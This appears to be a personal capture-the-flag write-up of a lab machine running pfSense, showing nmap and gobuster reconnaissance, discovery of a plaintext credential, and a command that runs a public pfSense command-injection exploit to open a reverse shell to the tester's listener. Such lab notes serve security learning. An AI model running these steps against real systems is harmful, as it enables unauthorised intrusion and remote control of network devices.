## Nmap Port Scanning
- <mark>Basic Scan</mark>
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -T4  10.10.10.60 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-04 14:44 EDT
Nmap scan report for 10.10.10.60
Host is up (0.029s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
443/tcp open  ssl/http lighttpd 1.4.35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.86 seconds
```
- <mark>More Specific Scan Targeting Port 80</mark>
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -sC -T4  10.10.10.60 -p 80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-04 14:49 EDT
Nmap scan report for 10.10.10.60
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_http-server-header: lighttpd/1.4.35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
```
- <mark>More Specific Scan Targeting Port 443</mark>
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -sC -T4  10.10.10.60 -p 443
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-04 14:54 EDT
Nmap scan report for 10.10.10.60
Host is up (0.026s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http lighttpd 1.4.35
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-server-header: lighttpd/1.4.35
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.09 seconds
```
#### 443/tcp ssl/http lighttpd 1.4.35
- <makr>Diretory Brute-Forcing</mark>
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x .txt -k                                                          
	===============================================================
	Gobuster v3.5
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     https://10.10.10.60
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.5
	[+] Extensions:              txt
	[+] Follow Redirect:         true
	[+] Timeout:                 10s
	===============================================================
	2023/09/04 15:13:46 Starting gobuster in directory enumeration mode
	===============================================================
	/changelog.txt        (Status: 200) [Size: 271]
	/tree                 (Status: 200) [Size: 7492]
	/installer            (Status: 200) [Size: 6113]
	/system-users.txt     (Status: 200) [Size: 106]
	/%7Echeckout%7E       (Status: 403) [Size: 345]
	Progress: 441088 / 441122 (99.99%)
	===============================================================
	2023/09/04 15:41:27 Finished
	===============================================================
	```
	- `changelog.txt` reveals that 2/3 of the vulnerabilities has been patched.![[Pasted image 20230904155837.png]]
	- `system-users.txt` reveals the credential that can be used to perform login which is `rohit:pfsense`.![[Pasted image 20230904160014.png]]
	- After Successful login, one can identify `pfsense` version as `2.1.3`.![[Pasted image 20230904161226.png]]
- <mark>Exploitation</mark>
	- `searchsploit` reveals a potential candidate vulnerability, we can try to validate.
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ searchsploit pfsense
	
	pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection | php/webapps/43560.py
	```
	-  The python exploit work out-of-the-box after setting up corresponding listener.
	```bash
	python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.15 --lport 4444 --username rohit --password pfsense
	```
- <mark>Post-Exploitation</mark>'
```bash
No Need root privilege by default
```